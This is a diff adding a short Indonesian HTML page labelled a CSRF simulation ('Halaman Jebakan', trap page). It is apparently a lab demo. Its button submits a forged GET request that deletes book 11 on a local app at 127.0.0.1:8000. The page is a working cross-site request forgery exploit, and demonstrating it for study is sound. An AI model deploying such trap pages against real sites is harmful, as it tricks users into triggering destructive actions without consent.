@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Simulasi CSRF</title>
+</head>
+<body>
+    <h2>Halaman Jebakan</h2>
+    <p>Klik tombol untuk menjalankan simulasi.</p>
+
+    <form
+        action="http://127.0.0.1:8000/buku/11/hapus"
+        method="GET"
+    >
+        <button type="submit">Klik di sini</button>
+    </form>
+</body>
+</html>
